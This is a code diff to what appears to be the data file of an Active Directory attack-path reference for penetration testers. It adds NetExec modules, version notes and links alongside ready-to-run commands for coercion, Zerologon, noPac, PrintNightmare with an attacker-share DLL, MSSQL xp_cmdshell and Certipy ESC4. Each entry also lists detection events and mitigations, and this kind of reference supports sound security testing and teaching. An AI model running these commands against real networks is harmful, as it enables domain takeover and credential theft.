@@ -148,10 +148,12 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
       { name: 'Coercer', url: 'https://github.com/p0dalirius/Coercer' },
       { name: 'PetitPotam', url: 'https://github.com/topotam/PetitPotam' },
       { name: 'krbrelayx', url: 'https://github.com/dirkjanm/krbrelayx' },
+      { name: 'NetExec (coerce_plus)', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       { label: 'Multi-method coercion', code: r`Coercer coerce -u user -p pass -t 10.0.0.10 -l 10.0.0.50 -d domain.local`, lang: 'bash' },
       { label: 'PetitPotam (EFSRPC) coercion', code: r`PetitPotam.py -u user -p pass -d domain.local 10.0.0.50 10.0.0.10`, lang: 'bash' },
+      { label: 'Check / fire coercion vectors (NetExec coerce_plus)', code: r`nxc smb <target> -u user -p pass -M coerce_plus -o LISTENER=<attacker_ip>`, lang: 'bash' },
     ],
     requires: ['Usually a valid domain account', 'Reachable RPC service (EFSRPC/RPRN/DFSNM) on the target'],
     mitre: mitre('T1187'),
@@ -313,6 +315,8 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
       { label: 'Add a key credential (pyWhisker)', code: r`pywhisker -d domain.local -u user -p pass --target TARGET --action add`, lang: 'bash' },
     ],
     requires: ['GenericWrite/GenericAll over the target msDS-KeyCredentialLink', 'PKINIT-capable DC (AD CS / KDC cert)'],
+    versions: ['srv2016', 'srv2019', 'srv2022', 'srv2025'],
+    affects: 'Key Trust / msDS-KeyCredentialLink mapping requires a Server 2016+ DC (the attribute and PKINIT key-trust support landed in 2016).',
     mitre: mitre('T1098'),
     references: [
       { label: 'HackTricks, Shadow Credentials', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.html' },
@@ -376,6 +380,7 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
       { label: 'Add a controlled machine account', code: r`addcomputer.py -computer-name 'evil$' -computer-pass 'Passw0rd!' domain.local/user:pass -dc-ip 10.0.0.1`, lang: 'bash' },
       { label: 'Write RBCD on the target computer', code: r`rbcd.py -delegate-to 'TARGET$' -delegate-from 'evil$' -action write domain.local/user:pass`, lang: 'bash' },
       { label: 'Get an impersonation ticket', code: r`getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/evil$:'Passw0rd!'`, lang: 'bash' },
+      { label: 'Abuse configured RBCD to impersonate (NetExec)', code: r`nxc smb <target> -u 'attacker$' -H <hash> --delegate Administrator`, lang: 'bash' },
     ],
     requires: ['Write over the target computer msDS-AllowedToActOnBehalfOfOtherIdentity', 'Ability to create/control a machine account'],
     references: [
@@ -428,8 +433,7 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     mitre: mitre('T1550.003'),
     references: [
       { label: 'HackTricks, Pass the Ticket', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/pass-the-ticket.html' },
-      { label: 'The Hacker Recipes, Pass the Ticket', url: 'https://www.thehacker.recipes/ad/movement/kerberos/ptt' },
-      { label: 'The Hacker Recipes, Pass the Cache', url: 'https://www.thehacker.recipes/ad/movement/kerberos/ptc' },
+      { label: 'MITRE ATT&CK, Pass the Ticket (T1550.003)', url: 'https://attack.mitre.org/techniques/T1550/003/' },
     ],
     opsec: 'Ticket use itself is normal Kerberos; anomalies come from lifetime, encryption type, or a TGT appearing on an unexpected host. Match realistic lifetimes/etypes.',
     difficulty: 'medium',
@@ -467,12 +471,16 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'CVE-2020-1472 PoC (dirkjanm)', url: 'https://github.com/dirkjanm/CVE-2020-1472' },
       { name: 'secretsdump (Impacket)', url: 'https://github.com/fortra/impacket' },
+      { name: 'NetExec (zerologon)', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       { label: 'Set DC machine password to empty', code: r`cve-2020-1472-exploit.py DC01 10.0.0.1`, lang: 'bash' },
       { label: 'DCSync with the empty machine account', code: r`secretsdump.py -just-dc -no-pass 'domain.local/DC01$@10.0.0.1'`, lang: 'bash' },
+      { label: 'Check if the DC is vulnerable (NetExec, no creds)', code: r`nxc smb <dc-ip> -M zerologon`, lang: 'bash' },
     ],
     requires: ['Network access to an unpatched DC (pre Aug-2020 patch)'],
+    versions: ['srv2008', 'srv2012', 'srv2016', 'srv2019'],
+    affects: 'Server 2008 R2 through Server 2019 DCs (Netlogon, before the Aug-2020 patch); disclosed before Server 2022 shipped.',
     mitre: mitre('T1068'),
     opsec: 'High-signal: many anomalous Netlogon auths (4742/5805) and a DC password change. Emptying the DC password breaks replication, so always restore the original machine password afterward.',
     difficulty: 'medium',
@@ -487,11 +495,15 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'noPac', url: 'https://github.com/Ridter/noPac' },
       { name: 'Impacket', url: 'https://github.com/fortra/impacket' },
+      { name: 'NetExec (nopac)', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       { label: 'Scan and exploit', code: r`noPac.py domain.local/user:pass -dc-ip 10.0.0.1 -dc-host DC01 --impersonate Administrator -dump`, lang: 'bash' },
+      { label: 'Check a DC for noPac (NetExec)', code: r`nxc smb <dc-ip> -u user -p pass -M nopac`, lang: 'bash' },
     ],
     requires: ['Any valid domain account', 'MachineAccountQuota > 0', 'Unpatched DC (pre Nov-2021 patch)'],
+    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022'],
+    affects: 'Server 2012 R2 through Server 2022 DCs, before the Nov-2021 patch (KB5008102 / KB5008380).',
     mitre: mitre('T1068'),
     references: [
       {
@@ -502,7 +514,6 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
         label: 'Microsoft KB5008102, SAM hardening (CVE-2021-42278)',
         url: 'https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e',
       },
-      { label: 'The Hacker Recipes, sAMAccountName spoofing', url: 'https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing' },
     ],
     opsec: 'Machine-account creation/rename (4741/4781) and DC-name collisions are detectable. Setting MachineAccountQuota to 0 and patching close the path.',
     difficulty: 'medium',
@@ -806,6 +817,8 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
       { label: 'Grant yourself retrieval rights first (GenericAll)', code: r`bloodyAD -u user -p pass -d domain.local --host dc01 add gmsaGroup '<gMSA$>' '<attacker>'`, lang: 'bash' },
     ],
     requires: ['Membership in the gMSA\'s msDS-GroupMSAMembership (PrincipalsAllowedToRetrieveManagedPassword), or GenericAll to grant it', 'LDAPS reachable (NetExec --gmsa requires it)'],
+    versions: ['srv2012', 'srv2016', 'srv2019', 'srv2022', 'srv2025'],
+    affects: 'gMSAs require a Server 2012+ DC (the KDS root key and msDS-ManagedPassword arrived in Server 2012).',
     references: [
       { label: 'The Hacker Recipes, ReadGMSAPassword', url: 'https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword' },
       { label: 'NetExec wiki, Dump gMSA', url: 'https://www.netexec.wiki/ldap-protocol/dump-gmsa' },
@@ -893,12 +906,16 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'CVE-2021-1675 (cube0x0)', url: 'https://github.com/cube0x0/CVE-2021-1675' },
       { name: 'Invoke-Nightmare (calebstewart)', url: 'https://github.com/calebstewart/CVE-2021-1675' },
+      { name: 'NetExec (printnightmare)', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       { label: 'Remote exploit via a DLL share', code: r`CVE-2021-1675.py domain.local/user:pass@10.0.0.10 '\\10.0.0.50\share\evil.dll'`, lang: 'bash' },
       { label: 'Local LPE (add local admin)', code: r`Invoke-Nightmare -NewUser hacker -NewPassword 'Passw0rd!'`, lang: 'powershell' },
+      { label: 'Check spooler + vulnerability (NetExec)', code: r`nxc smb <host> -u user -p pass -M printnightmare`, lang: 'bash' },
     ],
     requires: ['The Print Spooler service running on the target', 'A valid domain account (remote) or local user (LPE)', 'Unpatched host (pre July-2021 OOB update)'],
+    versions: ['srv2008', 'srv2012', 'srv2016', 'srv2019', 'srv2022'],
+    affects: 'Print Spooler on Server 2008 R2 through Server 2022, before the July-2021 out-of-band update; disclosed before Server 2025 shipped.',
     mitre: mitre('T1068'),
     opsec: 'Spooler driver loads and the new DLL under the spool drivers path are detectable (RpcAddPrinterDriverEx, 808/4688 events). Disabling the Print Spooler where it is not needed fully mitigates it.',
     difficulty: 'medium',
@@ -972,7 +989,7 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     mitre: mitre('T1649'),
     references: [
       { label: 'HackTricks, AD CS Account Persistence', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html' },
-      { label: 'The Hacker Recipes, Pass the Certificate', url: 'https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate' },
+      { label: 'Certipy wiki, Authentication (Pass the Certificate / PKINIT)', url: 'https://github.com/ly4k/Certipy/wiki/07-%E2%80%90-Authentication' },
       { label: 'The Hacker Recipes, UnPAC the hash', url: 'https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash' },
     ],
     opsec: 'PKINIT logons are auditable (4768 with certificate info) and certificates outlive password resets, making them durable. Certipy auth performs UnPAC-the-hash automatically after obtaining the TGT.',
@@ -988,11 +1005,14 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
       { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
+      { name: 'NetExec (enum_links)', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       { label: 'Connect (Windows auth)', code: r`mssqlclient.py -windows-auth domain.local/user:pass@10.0.0.30`, lang: 'bash' },
       { label: 'Enumerate links, hop, exec', code: r`enum_links` + '\n' + r`use_link LINKED-SQL` + '\n' + r`enable_xp_cmdshell` + '\n' + r`xp_cmdshell whoami`, lang: 'sql' },
       { label: 'Crawl all links (PowerUpSQL)', code: r`Get-SQLServerLinkCrawl -Instance sql01 -Query "exec master..xp_cmdshell 'whoami'"`, lang: 'powershell' },
+      { label: 'Enumerate linked servers (NetExec)', code: r`nxc mssql <host> -u user -p pass -M enum_links`, lang: 'bash' },
+      { label: 'OS command on a linked server (NetExec)', code: r`nxc mssql <host> -u user -p pass -M link_xpcmd -o LINKED_SERVER=SQL02 CMD='whoami'`, lang: 'bash' },
     ],
     requires: ['A valid MSSQL login (Windows or SQL auth)', 'One or more linked servers with usable login mappings'],
     mitre: mitre('T1210'),
@@ -1009,14 +1029,17 @@ export const adAdditionNodes: TechniqueNodeDef[] = [
       'ESC4 is a dangerous ACL (WriteOwner/WriteDacl/WriteProperty/GenericAll, BloodHound: ADCSESC4) over a certificate template object rather than over the issued certs. Rewrite the template to be ESC1-vulnerable (enable Client Authentication EKU and ENROLLEE_SUPPLIES_SUBJECT and open enrollment), then perform the ESC1 attack to impersonate a Domain Admin, and restore the template afterward.',
     tools: [{ name: 'Certipy', url: 'https://github.com/ly4k/Certipy' }],
     commands: [
-      { label: 'Make template ESC1-vulnerable (save original)', code: r`certipy template -u user@domain.local -p pass -template VulnTemplate -save-old`, lang: 'bash' },
+      { label: 'Make the template ESC1-vulnerable (Certipy v5 auto-saves the original)', code: r`certipy template -u user@domain.local -p pass -dc-ip 10.0.0.1 -template VulnTemplate -write-default-configuration`, lang: 'bash' },
       { label: 'Then run the ESC1 enrollment', code: r`certipy req -u user@domain.local -p pass -ca CORP-CA -template VulnTemplate -upn administrator@domain.local`, lang: 'bash' },
-      { label: 'Restore the original template config', code: r`certipy template -u user@domain.local -p pass -template VulnTemplate -configuration VulnTemplate.json`, lang: 'bash' },
+      { label: 'Restore the original template config', code: r`certipy template -u user@domain.local -p pass -dc-ip 10.0.0.1 -template VulnTemplate -write-configuration VulnTemplate.json -no-save`, lang: 'bash' },
     ],
     requires: ['A dangerous write ACL over a certificate template', 'A reachable, enabled CA to enroll against'],
     mitre: mitre('T1649'),
     references: [
-      { label: 'HackTricks, AD CS Domain Escalation (ESC4)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },{ label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' }],
+      { label: 'Certipy wiki, Privilege Escalation (ESC4)', url: 'https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation' },
+      { label: 'HackTricks, AD CS Domain Escalation (ESC4)', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html' },
+      { label: 'The Hacker Recipes, AD CS', url: 'https://www.thehacker.recipes/ad/movement/adcs/' },
+    ],
     opsec: 'Editing a template is a directory write (5136) and momentarily exposes an over-permissive template domain-wide; the subsequent cross-account cert request is logged on the CA (4886/4887). Restore the template promptly to limit the window.',
     difficulty: 'hard',
   },
@@ -1402,8 +1425,8 @@ export const adAdditionEdges: AttackEdge[] = [
   { source: 'user-foothold', target: 'valid-domain-creds', label: 'act as the user' },
   // zerologon now lives in the 'Quick Compromise' category (off network-recon).
   { source: 'zerologon', target: 'dcsync' },
-  { source: 'nopac', target: 'dcsync' },
-  { source: 'nopac', target: 'domain-admin' },
+  { source: 'nopac', target: 'dcsync', label: 'as the DC, replicate' },
+  { source: 'nopac', target: 'domain-admin', label: 'impersonate Administrator' },
   { source: 'laps-read', target: 'local-admin-host', label: 'local admin pw', rel: 'cred-reuse' },
   { source: 'gmsa-read', target: 'pass-the-hash', label: 'derived NT hash' },
   { source: 'gpo-abuse', target: 'domain-admin', label: 'task on DC/linked' },
